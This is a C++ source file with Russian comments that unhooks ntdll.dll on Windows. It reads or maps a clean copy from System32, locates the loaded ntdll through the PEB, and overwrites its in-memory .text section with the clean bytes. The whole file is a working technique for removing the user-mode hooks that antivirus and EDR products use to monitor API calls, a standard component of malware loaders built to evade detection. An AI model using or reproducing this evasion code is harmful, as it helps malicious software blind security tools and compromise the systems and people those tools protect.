#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <algorithm>
#include <string>


#define MAP_NTDLL
// or
//#define READ_NTDLL

#define NTDLL "NTDLL.DLL"

// маппим нехукнутую DLL с диска
BOOL ReadNtdllFromDisk(OUT PVOID* ppNtdllBuf) {

	CHAR	    cWinPath[MAX_PATH / 2] = { 0 };
	CHAR	    cNtdllPath[MAX_PATH] = { 0 };
	HANDLE      hFile = NULL;
	DWORD       dwNumberOfBytesRead = NULL,
		dwFileLen = NULL;
	PVOID       pNtdllBuffer = NULL;


	if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
		printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);


	hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	dwFileLen = GetFileSize(hFile, NULL);
	pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileLen);


	if (!ReadFile(hFile, pNtdllBuffer, dwFileLen, &dwNumberOfBytesRead, NULL) || dwFileLen != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
		printf("[i] Read %d of %d Bytes \n", dwNumberOfBytesRead, dwFileLen);
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
	if (hFile)
		CloseHandle(hFile);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;
}

// Получаем базовый адрес ntdll в текущем процессе
PVOID FetchLocalNtdllBaseAddress() {
	PTEB teb = static_cast<PTEB>(NtCurrentTeb());
	PPEB peb = teb->ProcessEnvironmentBlock;
	PLIST_ENTRY listHead = &peb->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY listEntry = listHead->Flink;

	ULONG addr = 0X0;
	while (listEntry != listHead)
	{
		PLDR_DATA_TABLE_ENTRY ldrEntry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		std::wstring dllName = ldrEntry->FullDllName.Buffer;
		std::transform(dllName.begin(), dllName.end(), dllName.begin(), ::tolower);

		if (dllName.find(L"c:\\windows\\system32\\ntdll.dll") != std::wstring::npos) {
			return ldrEntry->DllBase;
		}

		listEntry = listEntry->Flink;
	}
	return (PVOID)addr;
}


// маппим нехукнутую DLL с диска
BOOL MapNtdllFromDisk(OUT PVOID* ppNtdllBuf) {

	HANDLE  hFile = NULL,
		hSection = NULL;
	CHAR    cWinPath[MAX_PATH / 2] = { 0 };
	CHAR    cNtdllPath[MAX_PATH] = { 0 };
	PBYTE   pNtdllBuffer = NULL;


	if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
		printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}


	sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);


	hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}


	hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
	if (hSection == NULL) {
		printf("[!] CreateFileMappingA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	
	pNtdllBuffer = (PBYTE)MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (pNtdllBuffer == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
	if (hFile)
		CloseHandle(hFile);
	if (hSection)
		CloseHandle(hSection);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;
}


BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll /*адрес нехукнутой ntdll в памяти*/) {

	PVOID pLocalNtdll; //базовый адрес загрузки хукнутой ntdll.dll
	pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();


	PIMAGE_DOS_HEADER   pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;



	PIMAGE_NT_HEADERS   pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt = NULL,	// адрес секции .text хукнутой либы
		pRemoteNtdllTxt = NULL; // адрес .text секции анхукнутой либы
	SIZE_T		sNtdllTxtSize = NULL; 



	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		// if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {

			// получаем адрес .text секции хукнутой ntdll.dll
			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
#ifdef MAP_NTDLL
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
#endif
#ifdef READ_NTDLL
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);
			if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
		
				pRemoteNtdllTxt = (PVOID)((char*)pRemoteNtdllTxt + 3072);

				if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
					return FALSE;
			}
#endif
			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}


	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;


	DWORD dwOldProtection = NULL;

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}

int main() {
	PVOID ppNtdllBuf = NULL;
	PVOID pUnhookedTxtNtdll = NULL;
	ULONG_PTR addr;
#ifdef READ_NTDLL
	if (ReadNtdllFromDisk(&ppNtdllBuf)) {

		if (ReplaceNtdllTxtSection(ppNtdllBuf)) {
			std::cout << "success" << std::endl;
		}
	}
#endif

#ifdef MAP_NTDLL
	if (MapNtdllFromDisk(&ppNtdllBuf)) {
		if (ReplaceNtdllTxtSection(ppNtdllBuf)) {
			std::cout << "success" << std::endl;
		}
	}
#endif
	return 0;
}